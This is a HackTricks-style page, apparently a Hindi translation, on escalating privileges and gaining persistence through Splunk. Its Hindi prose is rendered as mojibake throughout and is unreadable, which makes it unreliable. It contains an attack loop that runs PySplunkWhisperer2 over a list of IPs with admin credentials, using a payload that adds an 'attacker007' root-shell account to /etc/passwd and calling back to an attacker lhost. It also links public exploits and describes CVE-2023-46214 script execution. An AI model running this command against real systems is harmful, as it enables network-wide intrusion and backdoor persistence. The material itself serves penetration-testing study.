# рд╕реНрдкреНрд▓рдВрдХ LPE рдФрд░ рд╕реНрдерд┐рд░рддрд╛

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ **рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдорд╢реАрди рдХреЛ **рдЖрдВрддрд░рд┐рдХ** рдпрд╛ **рдмрд╛рд╣реНрдп рд░реВрдк рд╕реЗ рдЬрд╛рдБрдЪрддреЗ** рд╕рдордп **Splunk рдЪрд▓ рд░рд╣рд╛ рд╣реИ** (рдкреЛрд░реНрдЯ 8090), рдФрд░ рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдХрд┐рд╕реА рд╡реИрдз рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рдХрд╛ рдЬреНрдЮрд╛рди рд╣реИ, рддреЛ рдЖрдк **Splunk рд╕реЗрд╡рд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░рдХреЗ **рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рд╢реИрд▓** рдХреЛ **рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ Splunk рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИред рдпрджрд┐ рдпрд╣ root рджреНрд╡рд╛рд░рд╛ рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ root рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдиреНрдирдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдЖрдк **рдкрд╣рд▓реЗ рд╕реЗ рд╣реА root рд╣реИрдВ рдФрд░ Splunk рд╕реЗрд╡рд╛ рдХреЗрд╡рд▓ localhost рдкрд░ рд╕реБрди рд░рд╣реА рдирд╣реАрдВ рд╣реИ**, рддреЛ рдЖрдк Splunk рд╕реЗрд╡рд╛ рд╕реЗ **рдкрд╛рд╕рд╡рд░реНрдб** рдлрд╝рд╛рдЗрд▓ **рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ **рдкрд╛рд╕рд╡рд░реНрдб рдХреНрд░реИрдХ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╛ рдЙрд╕рдореЗрдВ **рдирдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ**ред рдФрд░ рдореЗрдЬрдмрд╛рди рдкрд░ рд╕реНрдерд┐рд░рддрд╛ рдмрдирд╛рдП рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВред

рдкрд╣рд▓реА рдЫрд╡рд┐ рдореЗрдВ рдиреАрдЪреЗ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ Splunkd рд╡реЗрдм рдкреГрд╖реНрда рдХреИрд╕рд╛ рджрд┐рдЦрддрд╛ рд╣реИред

## рд╕реНрдкреНрд▓рдВрдХ рдпреВрдирд┐рд╡рд░реНрд╕рд▓ рдлреЙрд░рд╡рд░реНрдбрд░ рдПрдЬреЗрдВрдЯ рд╢реЛрд╖рдг рд╕рд╛рд░рд╛рдВрд╢

**рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП рдкреЛрд╕реНрдЯ рджреЗрдЦреЗрдВ [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)**

**рд╢реЛрд╖рдг рдЕрд╡рд▓реЛрдХрди:**
Splunk рдпреВрдирд┐рд╡рд░реНрд╕рд▓ рдлреЙрд░рд╡рд░реНрдбрд░ рдПрдЬреЗрдВрдЯ (UF) рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ рд╢реЛрд╖рдг рдЕрдЯреИрдХ рдЕрдЯреИрдХрд░реНрд╕ рдХреЛ рдПрдЬреЗрдВрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд╡рд┐рдЪрд┐рддреНрд░ рдХреЛрдб рдХреЛ рдирд┐рд╖реЗрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкреВрд░реА рдиреЗрдЯрд╡рд░реНрдХ рдХреЛ рдХрдВрдкреНрд░рдорд╛рдЗрдЬ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**рдореБрдЦреНрдп рдмрд┐рдВрджреБ:**
- UF рдПрдЬреЗрдВрдЯ рдЖрдиреЗ рд╡рд╛рд▓реА рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдпрд╛ рдХреЛрдб рдХреА рдкреНрд░рд╛рдорд╛рдгрд┐рдХрддрд╛ рдХреА рдкреБрд╖реНрдЯрд┐ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЕрдирдзрд┐рдХреГрдд рдХреЛрдб рдирд┐рд╖реЗрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред
- рд╕рд╛рдорд╛рдиреНрдп рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рд╛рдкреНрддрд┐ рд╡рд┐рдзрд┐рдпреЛрдВ рдореЗрдВ рдЙрдиреНрд╣реЗрдВ рдиреЗрдЯрд╡рд░реНрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ, рдлрд╝рд╛рдЗрд▓ рд╕рд╛рдЭрд╛рдХрд░рдг рдпрд╛ рдЖрдВрддрд░рд┐рдХ рдкреНрд░рд▓реЗрдЦрди рдореЗрдВ рдвреВрдВрдврдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред
- рд╕рдлрд▓ рд╢реЛрд╖рдг рд╕рдВрдХреНрд░рдорд┐рдд рд╣реЛрд╕реНрдЯ рдкрд░ SYSTEM рдпрд╛ рд░реВрдЯ рд╕реНрддрд░ рдХреА рдкрд╣реБрдВрдЪ, рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд╕реАрдХрд░рдг рдФрд░ рдЖрдЧреЗ рдХреА рдиреЗрдЯрд╡рд░реНрдХ рдШреБрд╕рдкреИрда рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**рд╢реЛрд╖рдг рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди:**
1. рд╣рдорд▓рд╛рд╡рд░ UF рдПрдЬреЗрдВрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред
2. рдПрдЬреЗрдВрдЯреНрд╕ рдХреЛ рдХрдорд╛рдВрдб рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП Splunk API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред
3. рд╕рдВрднрд╛рд╡рд┐рдд рдХреНрд░рд┐рдпрд╛рдПрдБ рдлрд╝рд╛рдЗрд▓ рдирд┐рдХрд╛рд╕реА, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдкреНрд░рдмрдВрдзрди рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдХрдВрдкреНрд░рдорд╛рдЗрдЬ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

**рдкреНрд░рднрд╛рд╡:**
- рдкреНрд░рддреНрдпреЗрдХ рд╣реЛрд╕реНрдЯ рдкрд░ SYSTEM/root рд╕реНрддрд░ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдкреВрд░реА рдиреЗрдЯрд╡рд░реНрдХ рдХрдВрдкреНрд░рдорд╛рдЗрдЬред
- рдкрдХрдбрд╝рдиреЗ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд▓реЙрдЧрд┐рдВрдЧ рдХреЛ рдирд┐рд╖реЗрдзрд┐рдд рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ред
- рдмреИрдХрдбреЛрдЕрд░реНрд╕ рдпрд╛ рд░реИрдВрд╕рдорд╡реЗрдпрд░ рдХреА рд╕реНрдерд╛рдкрдирд╛ред

**рд╢реЛрд╖рдг рдХреЗ рд▓рд┐рдП рдЙрджрд╛рд╣рд░рдг рдХрдорд╛рдВрдб:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
## Splunk LPE рдФрд░ Persistence

**рдЙрдкрдпреЛрдЧреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЙрддреНрдкрд╛рдж:**
* [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
* [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
* [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Splunk рдХреНрд╡реЗрд░реА рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

**рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП рдкреЛрд╕реНрдЯ рджреЗрдЦреЗрдВ [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

**CVE-2023-46214** рдиреЗ **`$SPLUNK_HOME/bin/scripts`** рдореЗрдВ рдПрдХ рд╡рд┐рдЪрд┐рддреНрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдФрд░ рдлрд┐рд░ рдмрддрд╛рдпрд╛ рдХрд┐ рдЦреЛрдЬ рдХреНрд╡реЗрд░реА **`|runshellscript script_name.sh`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд╣рд╛рдБ рд╕рдВрдЧреНрд░рд╣рд┐рдд **рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рдХреЛ **рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд** рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ред
